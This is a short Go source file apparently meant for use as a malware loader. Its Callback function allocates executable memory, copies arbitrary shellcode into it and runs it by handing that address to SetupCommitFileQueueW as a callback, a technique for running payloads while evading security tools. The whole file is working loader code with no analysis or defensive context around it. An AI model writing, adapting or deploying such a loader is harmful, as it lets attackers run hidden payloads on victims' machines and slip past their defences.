package TT

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	SP_COPY_NOSKIP         = 0x0000400
)

var (
	kernel32              = syscall.MustLoadDLL("kernel32.dll")
	ntdll                 = syscall.MustLoadDLL("ntdll.dll")
	Setupapi              = syscall.MustLoadDLL("Setupapi.dll")
	User32                = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc          = kernel32.MustFindProc("VirtualAlloc")
	SetupOpenFileQueue    = Setupapi.MustFindProc("SetupOpenFileQueue")
	SetupQueueCopyW       = Setupapi.MustFindProc("SetupQueueCopyW")
	SetupCommitFileQueueW = Setupapi.MustFindProc("SetupCommitFileQueueW")
	GetTopWindow          = User32.MustFindProc("GetTopWindow")
	RtlMoveMemory         = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	hQueue, _, _ := SetupOpenFileQueue.Call()
	p1, _ := syscall.UTF16PtrFromString("c:\\")
	p2, _ := syscall.UTF16PtrFromString("\\windows\\sytem32\\")
	p3, _ := syscall.UTF16PtrFromString("kernel32.dll")
	p4, _ := syscall.UTF16PtrFromString("c:\\windows\\temp\\")
	SetupQueueCopyW.Call(hQueue,
		uintptr(unsafe.Pointer(p1)),
		uintptr(unsafe.Pointer(p2)),
		uintptr(unsafe.Pointer(p3)),
		NULL,
		NULL,
		uintptr(unsafe.Pointer(p4)),
		uintptr(unsafe.Pointer(p3)),
		SP_COPY_NOSKIP,
	)
	Gtw, _, _ := GetTopWindow.Call()
	SetupCommitFileQueueW.Call(Gtw, hQueue, addr, NULL)
}
